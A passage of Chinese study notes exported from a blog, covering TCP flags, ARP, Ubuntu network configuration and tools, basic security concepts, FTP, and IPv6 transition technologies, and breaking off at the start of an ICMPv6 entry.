Flag):当进行网络连接时，必须说明这个联机的状态，使接收端了解这个数据包的主要动作。这个子段为6bits，分别代表6个句柄，若为1则为启动。说明如下所示。<ul><li> URG （Urgent)）: 为1表示该数据包为紧急数据包，接收端应该紧急处理。</li><li>ACK (Acknowledge):为1表示这个数据包为确认数据包，与Acknowledge Number有关</li><li>PSH (Push function):为1表示要求对方立即传送缓冲区内的其他对应数据包，而无须等待缓冲区满。</li><li>RST （Reset):为1表示联机会马上结束，而无须等待终止确认手续。这是个强制结束的联机,且发送端已断线。</li><li>SYN (Svnchronous):为1表示发送端希望双方建立同步处理，即要求建立联机。通常带有SYN标志的数据包表示“主动”要连接到对方的意思。</li></ul></li><li><strong>滑动窗口</strong>（Window):用于控制数据包的流量，可以告知对方目前有多少缓冲区容量(Receive Buffer)可以接收数据包。当Window=0时，表示缓冲器已经额满。</li><li><strong>确认校验码</strong>（Checksum);数据由发送端送出前会进行一个检验的动作，并将该动作的检验值标注在这个字段上。而接收者收到这个数据包之后，会再次对数据包进行验证，并且与原来发送的确认校验码值进行对比,如果相符就接收，若不符就认为该数据包已经损毁，要求对方</li><li><strong>紧急信息</strong> （Urgent Pointer ):该字段在 Code字段内的URG值为1时才会产生作用，告知紧急数据所在的位置。</li><li>任意资料（Options）</li></ol><h4 id="P220-ARP-RARP概念"><a href="#P220-ARP-RARP概念" class="headerlink" title="P220: ARP/RARP概念"></a>P220: ARP/RARP概念</h4><p>任何一台主机（确切的说是任何一个网络适配器）在物理上唯一的标识是48bit适配器的地址，即MAC地址 ( Media Access Controladdress)。这个地址保存在网络适配器的ROM中，是不能修改的。在实际应用中,田户可 以为任意一个网络适配器指定不同的IP地址。</p><p>MAC地址是所有网络活动的基础,但是网上的主机之间的通信是通过IP地址讲行的,因此在这个过程中就存在一个转换，即MAC地址与IP地址的对应，实现这一地址解析的协议为ARP(地址解析协议）和RARP（逆地址解析协议）。</p><ul><li>ARP为IP地址到对应的硬件MAC 地址之间提供动态映射，这个过程是自动完成的,一般应用程序或系统管理员不必操作中间流程。</li><li>RARP用于那些没有磁盘驱动器的系统（一般是无盘工作站或X终端)，它需要系统管理员进行手工设置，提供MAC地址到IP地址的解析。</li></ul><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212221237222.png" alt="image-20230212221237222" style="zoom: 80%;" /><h4 id="P225-227-网络配置文件"><a href="#P225-227-网络配置文件" class="headerlink" title="P225-227: 网络配置文件"></a>P225-227: 网络配置文件</h4><p>Ubuntu Linux为适应不同需求，在进行网络访问时，需要配置网络配置文件，这些配置文件位于”/etc“目录下。</p><p><strong>1./etc/network/interfaces网络基本信息配置文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cat &#x2F;etc&#x2F;network&#x2F;interfaces&#x2F;&#x2F;lo接口的配置信息1 auto lo &#x2F;&#x2F;系统开机时，自动启动lo接口2 iface lo inet loopback &#x2F;&#x2F;设置lo接口的地址信息，此处设置为本地回环(loopback)3&#x2F;&#x2F;系统中一块网卡eth0接口的配置信息&#x2F;&#x2F;一个网卡对应一个地址的基本配置方法：4 auto eth0 &#x2F;&#x2F;系统开机时，自动启动eth0接口，该接口为系统默认的第一块网卡所在的接口5 iface eth0 inet dhcp &#x2F;&#x2F;设置eth0接口的地址信息，此处设置为动态自动获取(dhcp)6 address 192.168.1.21 &#x2F;&#x2F;设置eth0接口的一个静态IP地址为192.168.1.217 netmask 255.255.255.0 &#x2F;&#x2F;设置eth0接口的子网掩码为255.255.255.08 gateway 192.168.1.1 &#x2F;&#x2F;设置eth0接口的静态网关地址为192.168.1.1&#x2F;&#x2F;同一个物理网卡设备上有多个地址的基本配置方法：11 auto eth0 eth0:112 iface eth0 inet static13 address 192.168.1.10014 netmask 255.255.255.015 gateway 192.168.1.1 16 iface eth0:1 inet static17 address 192.168.1.20018 netmask 255.255.255.019 gateway 192.168.1.1 &#x2F;&#x2F;不同接口上配置多个网卡的基本配置方法：21 auto eth0 eth122 iface eth0 inet static23 address 192.168.0.12524 netmask 255.255.255.025 gateway 192.168.1.1 26 iface eth1 inet static27 address 192.168.0.13728 netmask 255.255.255.029 gateway 192.168.1.1 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(auto lo)</p><p><strong>2.其他网络相关配置文件</strong></p><p>（考基本的端口号）</p><ul><li><p>/etc/hosts 主机名映射文件</p><p>在网络上实现域名和IP地址的映射的两种方法：大量域名解析采用DNS服务器，小型网络可使用/etc/hosts文件提供解析。文件包含部分常用IP地址和主机名/主机名别名之间的映射</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;文件种没有tom主机信息，因此会登陆失败。添加tom记录：$ sudo vim &#x2F;etc&#x2F;hosts127.0.0.1 localhost127.0.1.1 abc &#x2F;&#x2F;当前用户192.168.1.93 netservice.webservice.bamms.com tom&#x2F;&#x2F;登录主机$ftp tom<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>/etc/host.conf 配置名称解析器</p><pre class="line-numbers language-none"><code class="language-none">$ cat &#x2F;etc&#x2F;host.conforder hosts,bindmulti on<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>”order”指定主机名查询顺序，其参数用逗号隔开的查找方法。支持的查找方法为bind和hosts，分别代表DNS、/etc/hosts，此处规定先查询/etc/hosts文件，然后再使用DNS来解析域名</p></li><li><p><font color=Brown><strong>/etc/services 端口映射文件</strong></font></p><p>(判断)</p><pre class="line-numbers language-none"><code class="language-none">ftp-data 20&#x2F;tcpftp 21&#x2F;tcpfsp 21&#x2F;udp  fspdssh 22&#x2F;tcptelnet 23&#x2F;tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>/etc/resolv.conf 配置DNS客户</p></li></ul><h4 id="P228-P233-常用网络管理工具"><a href="#P228-P233-常用网络管理工具" class="headerlink" title="P228-P233: 常用网络管理工具"></a>P228-P233: 常用网络管理工具</h4><ul><li><p><strong>ifconfig 配置网络地址信息</strong></p><p>显示或临时配置当前主机某张网卡的IP地址。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">interface 网络接口的名称，如eth0(网卡) ifconfig eth0 &#x2F;&#x2F;查看eth0的网络情况ifconfig eth0 up&#x2F;down &#x2F;&#x2F;激活或关闭eth0ifconfig eth0 192.168.0.25 netmask 255.255.255.0 &#x2F;&#x2F;设置eth0的IP地址和子网掩码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>nslookup 域名解析测试</strong></p><p>查询一台机器的IP地址和其对应的域名，使用权限为所有用户，它一般需要一台域名服务器来提供域名服务。“&gt;”后输入查询IP地址，“exit”退出。</p></li><li><p><strong>ping 测试网络状态</strong></p><p>测试网络是否可达。“Time out”主机不可达，若数据包丢失严重则说明网络很不稳定。</p><pre class="line-numbers language-none"><code class="language-none">ping www.baidu.com -c 3 &#x2F;&#x2F;发送三个数据包来测试<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>ip 网络配置工具</p><p>ip [options] object [ command [arguments] ]</p><ul><li><p>options参数</p><ul><li>-v 打印iproute信息</li><li>-r 将ip地址转换成域名</li><li>-s 输出详细结果</li></ul></li><li><p>object 管理对象</p><ul><li>Link 网络接口设备，通常网卡</li><li>Address IP地址</li><li>Neighbour ARP记录</li><li>Rule 路由策略</li></ul><p>……</p></li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo ip addr add 192.168.44.122 dev eth0 &#x2F;&#x2F;添加IP地址到eth0网卡上sudo ip rule add from 192.168.0.25 prio 32777 reject &#x2F;&#x2F;丢弃源地址属于192.168.0.25网络的所有数据包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>netstat</strong></p><p>用来显示活动的TCP连接、计算机侦听端口、以太网统计信息、IP路由表、IPv4统计信息(IP,ICMP,TCP,UDP)以及IPv6统计信息(TCP,UDP)。</p><ul><li>-a  所有</li><li>-e 以太网的统计信息</li><li>-n 活动的TCP连接，数字形式</li><li>-o 活动的TCP连接</li><li>-p 协议</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">netstat -p -tcp &#x2F;&#x2F;查看tcp协议类型的连接netstat -p -tcp -udp &#x2F;&#x2F;仅显示TCP和UDP协议的统计信息netstat -o 5 &#x2F;&#x2F;每5秒显示一次活动的TCP连接和进程IDnetstat -n Co &#x2F;&#x2F;以数字形式显示活动的TCP连接和进程IDnetstat -e -s &#x2F;&#x2F;显示以太网统计信息和所有协议的统计信息netstat -a &#x2F;&#x2F;显示处于监听状态的所有端口neystat -ln &#x2F;&#x2F;显示当前主机监听的所有端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>ftp 访问命令</strong></p><p>用来进行远程文件传输。是标准的文件传输协议的用户接口，是TCP/IP网络计算机之间传输文件的简单有效的方法，允许传输ASCII和二进制文件。</p><p>ftp [-dignv] [主机名称IP地址]</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ftp&gt;命令ls &#x2F;&#x2F;列出远程机的当前目录cd &#x2F;&#x2F;在远程机上改变工作目录lcd &#x2F;&#x2F;在本地机上改变工作目录close &#x2F;&#x2F;终止当前的ftp会话hash &#x2F;&#x2F;每次传输完数据缓冲区中的数据后就显示一个#号get (mget) &#x2F;&#x2F;从远程机传送指定文件到本地机put (mput) &#x2F;&#x2F;从本地机传送指定文件到远程机quit &#x2F;&#x2F;断开与远程机的连接，并退出ftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>route 路由设置</p></li></ul><h4 id="P250：SSH服务使用"><a href="#P250：SSH服务使用" class="headerlink" title="P250：SSH服务使用"></a>P250：SSH服务使用</h4><p>SSH远程登录，端口号22</p><p><strong>安装SSH软件包</strong></p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps3.jpg" alt="img" style="zoom: 67%;" /> </center>启动服务，使用netstat监听ssh服务状态<center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps4.jpg" alt="img" style="zoom:67%;" /> </center>打开命令行输入ssh **用户@ip**进行远程连接<center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps5.jpg" alt="img" style="zoom: 50%;" /> </center>#### P255: 信息安全基础<p>例：什么是数字签名，什么是网络攻击，网络传输特性，是否具有保密性，什么是安全性</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/D1D3D1E4122B157885510E5764E3F031.jpg" alt="img" style="zoom: 25%;" /><p>网络攻击：</p><ul><li>中断：正在传输的信息被中止。</li><li>截获：在传输的过程中被其他窃听者获取敏感信息。</li><li>修改：正在传输的信息被其他人修改后再发送给接收方。</li><li>捏造：网络上的其他非法用户以真实用户的名义发送虚假信息。</li></ul><p>网络传输特性：</p><ul><li>Integrity（完整性):实现数据完整地传输给对方，即在传输的过程中不被修改。</li><li>Confidentiality（保密性):保证信息在传输的过程中不被其他人窃听获取。</li><li>Availability（可用性):网络上的服务器可以实时被利用。</li></ul><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212223644220.png" alt="image-20230212223644220" style="zoom:50%;" /><p>加密方式：</p><ul><li><p>对称加密（单钥）</p><ul><li>同一个密钥去加密和解密数据。发送方在发送信息前使用密钥（只有发送方和接收方知道）对数据进行加密，然后传输密文给接收方，接收方使用同样的密钥来解密密文，得到明文信息。</li><li>好处：算法成熟，易于实现；弊端：密钥管理</li><li>DES, 3DES, AES</li></ul></li><li><p>非对称加密（双钥）</p><ul><li>发送方在发送信息前使用接收方的公钥（所有人都知道）进行加密，然后传输密文给接收方，接收方使用自己的私钥（只有接收方自己知道）来解密密文，得到明文信息。</li><li>好处：不进行密钥传输，降低密钥管理风险；弊端：算法实现难度，速度慢</li><li>背包算法，RSA</li></ul><p>一般使用非对称方式加密密钥进行数据传输，使用传递的密钥来加密数据。</p></li></ul><p>数字签名：</p><p>解决问题：发送方否认问题，即发送方否认发送过某一信息；接收方否认问题，即接收方否认接收到某个消息</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212224831381.png" alt="image-20230212224831381" style="zoom: 50%;" /><ul><li><p>消息加密:整个消息的密文作为认证符。</p></li><li><p>消息认证码:MAC消息和密钥的公开函数，产生定长的值作为认证符。</p></li><li><p>Hash 函数:将任意长的消息映射为定长的 hash值的公开函数，以该hash值作为认证符。目前主要使用的数字签名算法有以下几种:</p></li><li><p>RSA算法:是目前应用最广泛的数字签名，Linux 下的 OpenSSH 中即使用这一算法。DSA (Digital Signature Algorithm）算法:基于有限域上的离散对数问题即 DSS（数字签名标准)。</p></li><li><p>GOST 算法:俄罗斯采用的数字签名标准算法。</p></li></ul><h4 id="P266-FTP"><a href="#P266-FTP" class="headerlink" title="P266: FTP"></a>P266: FTP</h4><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps2.jpg" alt="img" style="zoom: 50%;" /> </center>**主要功能：**<ol><li>不同等级的使用者。<ul><li>实体账号 real user</li><li>访客 guest</li><li>匿名登录者 anonymous</li></ul></li><li>命令记录与登录文件记录</li><li>限制或解除使用者所在的根目录。（提高安全性）</li></ol><p><strong>用户分类：</strong></p><ul><li>实体用户(Real user)。系统本机用户。Linux系统一般不会针对实体用户进行限制，因此用户可以针对整个文件系统进行所有的工作。这是非常危险的，为禁止系统使用的账号登录，管理员可以在文件/etc/ftpusrs中设定不允许登录的账号，如root是不允许登录FTP的。</li><li>访客(Guest)。访客用户。只能进行文件传输的用户，即虚拟用户，访问服务器时仍然需要验证。</li><li>匿名者(anonymous)。对于公共性质的服务器可以提供匿名用户访问（一般服务器很少使用)，但应对其进行尽可能多的限制，包括以下一些内容。<ul><li>允许的工作指令要减少很多。</li><li>限制文件传输的数量,尽量不要允许其上传数据。</li><li>设置匿名者同时登录的最大联机数量。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPv6过渡技术</title>
      <link href="/2022/12/24/IPv6%E8%BF%87%E6%B8%A1%E6%8A%80%E6%9C%AF/"/>
      <url>/2022/12/24/IPv6%E8%BF%87%E6%B8%A1%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="IPv6过渡技术"><a href="#IPv6过渡技术" class="headerlink" title="IPv6过渡技术"></a>IPv6过渡技术</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 理解使用隧道机制实现IPv6穿越IPv4的原理</span><span class="token comment"># 掌握6to4自动隧道、ISATAP自动隧道的实现机制</span><span class="token comment"># 掌握Win 7下配置6to4路由器、ISATAP路由器的方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>[TOC]</p><h3 id="IPv6过渡技术概述"><a href="#IPv6过渡技术概述" class="headerlink" title="IPv6过渡技术概述"></a>IPv6过渡技术概述</h3><h4 id="IPv6过渡期的特点"><a href="#IPv6过渡期的特点" class="headerlink" title="IPv6过渡期的特点"></a>IPv6过渡期的特点</h4><ul><li>协议的过渡需要在网络中的所有节点上安装和配置新的协议，并且检验所有主机和路由器都能正确运行</li><li>要实施IPv6网络，必须充分考虑现有的网络条件，充分利用现有的条件构造下一代互联网，以避免过多的浪费</li></ul><h4 id="过渡时期采用技术的选择"><a href="#过渡时期采用技术的选择" class="headerlink" title="过渡时期采用技术的选择"></a>过渡时期采用技术的选择</h4><p><strong>双栈技术(Dual Stack)</strong></p><ul><li>让IPv4和IPv6共存于同一设备和网络中(RFC 2893)，采用该技术的节点上同时运行IPv4和IPv6两套协议栈</li><li>对IPv4和IPv6提供了完全的兼容，但对于IP地址耗尽问题没有任何帮助</li></ul><p><strong>隧道技术(Tunnel)</strong></p><ul><li>可以让IPv6业务在现有IPv4基础设施上传输(RFC2473、RFC2893、RFC3056)。将IPv6分组作为无结构的数据，封装在IPv4数据报中，被IPv4网络传输</li><li>隧道分为手工配置的隧道和自动配置的隧道</li><li>它不能解决IPv6节点和IPv4节点之间的相互通信问题</li></ul><p><strong>转换(翻译)技术</strong></p><ul><li>让纯IPv6节点能够和纯IPv4节点相互通信(RFC2766)</li><li>转换网关除了要进行IPv4和IPv6地址转换之外，还要进行协议的转换和翻译。</li></ul><h3 id="兼容的地址"><a href="#兼容的地址" class="headerlink" title="兼容的地址"></a>兼容的地址</h3><ol><li>IPv4兼容地址<ul><li>格式为:0:0:0:0:0:0:w.x.y.z:w或::w.x.y.z，(其中w.x.y.z是公共IPv4地址的点缀十进制表示)，用于IPv6/IPv4节点，它使IPv4/IPv6节点可以通过IPv4网络与IPv6节点进行通信</li><li>如果IPv6通信流的目的地址是IPv4兼容地址，则IPv6通信流会被IPv4报头自动封装，并通过IPv4网络发送到目标节点</li></ul></li><li>IPv4映射地址<ul><li>格式为:0:0:0:0:0:0:FFFF:w.x.y.z或::FFFF:w.x.y.z，用于将一个IPv4-only节点表示为一个IPv6节点，它仅用于内部表示</li><li>IPv4映射地址从不用作IPv6数据包的源地址或目的地址，主要用于一些在IPv4-only节点和IPv6-only节点间进行协议转换的实现方案中</li></ul></li><li>6over4地址</li></ol><ul><li>6over4地址由一个有效的64位单播地址前缀和接口标识符::WWXX:YYZZ组成(其中WWXX:YYZZ是接口的单播IPv41地J止w.X.y.2HJS1 八长示)</li><li>当使用RFC2529中定义的自动隧道机制时，系统会将6over4地址分配给一个连接到支持多播IPv4网络结构中的IPv6节点</li></ul><ol start="4"><li>6to4地址<ul><li>6to4地址基于前缀2002:WWXX:YYZZ::/48(其中WWXX:YYZZ是公共IPv4地址w.x.y.z的冒号十六进制表示)</li><li>当使用RFC3056中定义的自动隧道机制时，6to4地址前缀用于创建站点的全球地址前缀，以及站点中的IPv6节点的全球地址</li></ul></li><li>ISATAP地址<ul><li>ISATAP(Intra-Site Automatic Tunnel Addressing Protocol)地址由一个有效的64位IPv4单播地址前缀和接口标符::5EFE:w.x.y.z所组成(其中w.x.y.z是一个接口的单播IPv4地址)</li><li>当使用RFC5214中定义的自动隧迫礼制时，系统会将使用ISATAP接口标识符的地址分配给IPv6/IPv4节点</li></ul></li></ol><h3 id="双栈技术"><a href="#双栈技术" class="headerlink" title="双栈技术"></a>双栈技术</h3><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>即主机和路由器在同一网络接口上运行IPv4栈和IPv6栈。这样，双栈节点既可以接收和发送IPv4包和IPv6包，因而两个协议可以在同一网络中共存</p><img src="./IPv6协议结构/IPv6双栈技术示意图.png" style="zoom:67%;" /><h4 id="三种工作模式"><a href="#三种工作模式" class="headerlink" title="三种工作模式"></a>三种工作模式</h4><ul><li>只运行IPv6协议，对外呈现为IPv6节点;</li><li>只运行IPv4协议，对外呈现为IPv4节点;</li><li>同时运行IPv4协议和IPv6协议，对外呈现双栈模式。</li></ul><p>支持三种隧道模式为：不运行隧道；仅运行手工隧道；同时运行手工和自动隧道。</p><h4 id="双栈技术的特点"><a href="#双栈技术的特点" class="headerlink" title="双栈技术的特点"></a>双栈技术的特点</h4><blockquote><p>双栈技术是一切过渡技术的基础，隧道机制和翻译机制都要利用双栈节点</p></blockquote><ul><li>双栈技术应该能独立的配置IPv4和IPv6地址</li></ul><p>双栈技术的优点是互通性好，易于理解；缺点是需要给每个新的运行IPv6协议的网络设备和终端分配IPv4地址，不能解决IPv4地址短缺问题</p><h3 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h3><blockquote><p>隧道(Tunnel)是指将一种协议首部封装在另一种协议首部中，使得一种协议可以通过另一种协议的封装进行通信</p></blockquote><ul><li>优点在于隧道的透明性，不需要大量的IPv6专用设备和链路，可以明显的减少投资</li><li>缺点是配置麻烦，不能实现纯IPv4和纯IPv6主机之间的通信。</li></ul><h4 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a>工作原理</h4><ul><li>核心思想是通过把IPv6数据报文封装入IPv4数据报文中，让现有IPv4网络成为载体以建立IPv6的通信，隧道两端的节点间数据报文的传送通过IPv4机制进行，隧道被看成一个直接连接的通道</li><li>隧道有两个端点，隧道入口点和隧道出口点。在入口点，路由器将IPv6分组封装在IPv4中，该IPv4的源地址和目的地址分别是入口和出口的IPv4地址。在出口点将IPv6分组取出转发给目的站点</li></ul><h4 id="IPv6数据包的封装步骤"><a href="#IPv6数据包的封装步骤" class="headerlink" title="IPv6数据包的封装步骤"></a>IPv6数据包的封装步骤</h4><ul><li>入口点将IPv6跳数限制减去1，并把该数据包封装进某个IPv4首部中。IPv4首部“协议”域设置为”41”，指示这个分组的净荷是一个IPv6的分组</li><li>通过隧道传输封装后的数据包，如果必要，封装后的IPv4数据包进行分段</li><li>隧道出口点接收到封装后的数据包。如果数据包被分段，出口点进行重组</li><li>出口点剥离IPv4首部，将IPv6数据包传递到目的地址</li></ul><img src="./IPv6协议结构/IPv6数据包封装.png" style="zoom:67%;" /><h4 id="隧道的实现方式"><a href="#隧道的实现方式" class="headerlink" title="隧道的实现方式"></a>隧道的实现方式</h4><ul><li><p>为了让数据通过隧道，必须知道两个端点的地址。确定入口点的是直接的因为它出现在IPv4基础结构的边界;确定隧道的出口点要复杂些</p></li><li><p>根据隧道终点地址的获得方式可将隧道分为<strong>配置隧道</strong>和<strong>自动隧道</strong>，其中配置隧道主要用于路由器到路由器</p></li><li><p>自动隧道有以下几种方式:</p><ul><li>Tunnel Brokers(RFC 3053):基于服务器的半自动隧道;</li><li>6to4(RFC 3056):路由器到路由器;</li><li>ISATAP:主机到路由器，路由器到主机，也可以主机到主机;.</li><li>6over4(RFC 2529):主机到路由器，路由器到主机;</li><li>Teredo:通过IPv4 NAT建立隧道;</li></ul></li></ul><h5 id="过渡初期"><a href="#过渡初期" class="headerlink" title="过渡初期"></a>过渡初期</h5><ul><li>使IPv6报文在IPv4网络中传输。手动隧道包括IPv6 over lPv4隧道，自动隧道包括IPv4兼容IPv6自动隧道、6to4隧道和ISATAP隧道</li></ul><h5 id="过渡后期"><a href="#过渡后期" class="headerlink" title="过渡后期"></a>过渡后期</h5><ul><li>使用IPv4 over lPv6隧道，使IPv4报文在lPv6网络中传输。</li></ul><h4 id="配置隧道"><a href="#配置隧道" class="headerlink" title="配置隧道"></a>配置隧道</h4><ul><li>需要隧道两个端点所在网络的管理员协作完成</li><li>隧道的端点地址由配置来决定，不需要为站点分配特殊的IPv6地址</li><li>适用于经常通信的IPv6站点之间</li></ul><h4 id="基本的自动隧道技术"><a href="#基本的自动隧道技术" class="headerlink" title="基本的自动隧道技术"></a>基本的自动隧道技术</h4><ul><li>自动配置的隧道<ul><li>端点地址根据分组的目的地址确定，适用于单独的主机之间或者不经常通信的站点之间。需要站点使用IPv4兼容的IPv6地址(O::IPv4/96)，且站点之间有可用的IPv4连接，每个采用这种机制的主机都需要一个IPv4地址</li><li>不能解决IPv4地址空间耗尽的问题。两个端点都必须支持双协议栈</li></ul></li></ul><h5 id="IPv4多播隧道6-over-4"><a href="#IPv4多播隧道6-over-4" class="headerlink" title="IPv4多播隧道6 over 4"></a>IPv4多播隧道6 over 4</h5><ul><li>与配置隧道不同的是它不需要任何地址配置;与自动隧道不同的是它不要求使用lIPv4兼容的IPv6地址</li><li>当通过支持6 over 4的路由器与外界相连时，站点内的主机可以和外部IPv6站点通信</li></ul><h4 id="6to4隧道"><a href="#6to4隧道" class="headerlink" title="6to4隧道"></a>6to4隧道</h4><blockquote><p>6to4是一种自动隧道机制，通常在站点的边界路由器之间建立隧道，它为IPv6站点和主机之间提供了跨IPv4 Internet的单播IPv6连通性</p></blockquote><p><strong>使用前缀为2002:IPv4addr:/48的6to4地址，其中IPv4addr是站点边界路由器的IPv4地址</strong></p><ul><li>当两个站点中任两台主机通信时，隧道首节点自动从IPv6源地址和目的地址中提取出隧道首尾节点的IPv4地址，在两个站点的边界路由器之间建立一条IPv4隧道</li></ul><p>隧道不需要维护任何信息，通信开始时建立，通信结束时自动撤销</p><h5 id="6to4路由器"><a href="#6to4路由器" class="headerlink" title="6to4路由器"></a>6to4路由器</h5><blockquote><p>6to4路由器是支持使用6to4隧道接口的IPv6/IPv4路由器，它通常用于一个站点中的6to4主机和IPv4网络(如: Internet)上的其它6to4路由器或6to4中继路由器之间转发目标为6to4地址的通信流，充当了隧道的端点</p></blockquote><p>6to4路由器应实现双栈和6to4隧道功能，并且至少有一个全球唯一的可路由IPv4地址需要使用额外的处理逻辑，以正确地封装和拆封，并且还可能需要额外的手工配置</p><h5 id="6to4中继路由器"><a href="#6to4中继路由器" class="headerlink" title="6to4中继路由器"></a>6to4中继路由器</h5><ul><li>在Internet上的6to4路由器和IPv6 Internet上的主机之间转发目标为6to4地址的通信流的IPv6/IPv4路由器</li></ul><img src="./IPv6协议结构/6to4中继路由器.png" style="zoom:67%;" /><h4 id="lSATAP隧道"><a href="#lSATAP隧道" class="headerlink" title="lSATAP隧道"></a>lSATAP隧道</h4><blockquote><p>站点内自动隧道寻址协议(Intra-Site Automatic Tunnel AddressingProtocol)，将没有IPv6路由器的IPv4内部网中的IPv6节点连接起来，为IPv6主机之间提供了<strong>跨越IPv4内部网络</strong>单播IPv6连通性</p></blockquote><ul><li>ISATAP主机使用标准地址自动配置机制来创建lSATAP地址。ISATAP地址格式为:64位前缀:5EFE: w.x.y.z。其中前缀可以是链路本地地址前缀、站点本地前缀和全球前缀(包括6to4前缀)</li></ul><img src="./IPv6协议结构/ISATAP隧道.png" style="zoom:67%;" /><h3 id="协议转换技术"><a href="#协议转换技术" class="headerlink" title="协议转换技术"></a>协议转换技术</h3><h4 id="NAT技术"><a href="#NAT技术" class="headerlink" title="NAT技术"></a>NAT技术</h4><ul><li>NAT有三种类型:静态NAT;动态NAT;网络地址端口转换NAPT</li><li>对于IPv4向IPv6过渡机制来讲，这里的内网和外网可以分别对应IPv4网络或IPv6网络</li><li>NAT网关使用一个IPv4地址池，并把这些地址和相应IPv6地址绑定在一起。不需要对终端节点做任何修改</li><li>转换技术依据转换所对应计算机网络体系结构的层次。缺点是不支持lPv6高级特性，例如端到端的安全</li></ul><h3 id="过渡机制的选择"><a href="#过渡机制的选择" class="headerlink" title="过渡机制的选择"></a>过渡机制的选择</h3><p>在现有的IPv4网络上逐步融合IPv6技术，过渡的内容包括:</p><blockquote><p>网络的过渡；主机节点的过渡；应用程序的过渡；IPv4网络与IPv6网络之间的互通；IPv6网络之间的互通</p></blockquote><h4 id="lPv6过渡时期建议采用的过渡原则"><a href="#lPv6过渡时期建议采用的过渡原则" class="headerlink" title="lPv6过渡时期建议采用的过渡原则:"></a>lPv6过渡时期建议采用的过渡原则:</h4><ul><li>能直接建立IPv6链路的情况下，使用纯IPv6路由</li><li>不能使用IPv6链路的情况下，IPv6节点间使用隧道技术</li><li>双栈的IPv4/IPv6主机和纯IPv4或纯IPv6网络的主机通信尽量不要采用协议转换，直接自动选择相应的通信协议</li><li>纯IPv6网络和纯IPv4网络主机之间的通信，使用协议转换或应用层网关，所设计的协议转换器或ALG应该尽量保证不修改原有应用</li><li>采用逐步渐进的过渡方式，以保护原有IPv4网络的投资，过渡的技术应尽可能简单，尽量保证IPv4和IPv6之间的互操作性</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ICPMv6协议基础</title>
      <link href="/2022/12/16/ICMPv6/"/>
      <url>/2022/12/16/ICMPv6/</url>
      
        <content type="html"><![CDATA[<h2 id="ICMPv6协议"><a href="#ICMPv6协议" class="headerlink" title="ICMPv6协议"></a>ICMPv6协议</h2><p>[TOC]</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">#掌握四种差错报文的格式及用途#掌握请求&#x2F;回显报文的格式#理解IPv6的路径MTU发现过程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ICMPv6协议概述"><a href="#ICMPv6协议概述" class="headerlink" title="ICMPv6协议概述"></a>ICMPv6协议概述</h3><h4 id="ICMPv6的功能"><a href="#ICMPv6的功能" class="headerlink" title="ICMPv6的功能"></a>ICMPv6的功能</h4><blockquote><p style="color:orange;">IPv6的ICMP(Internet Control Message Protocol)，属于IPv6协议的一个组成部分，IPv6网络中的每一个节点均要实现ICMPv6</p></blockquote><ul><li><p>在IPv6分组<strong>不能被正确处理</strong>时，ICMPv<strong>6向源节点报告分组在传输过程中的出错信息和通告信息</strong>，使网络中的节点可以知道网络中所传输的IPv6分组的情况，以及当前网络状态的重要信息</p></li><li><p><strong>ICMPv6报文作为IPv6分组的数据载荷</strong></p></li></ul><h4 id="lCMPv6与ICMPv4的比较"><a href="#lCMPv6与ICMPv4的比较" class="headerlink" title="lCMPv6与ICMPv4的比较"></a>lCMPv6与ICMPv4的比较</h4><blockquote><p 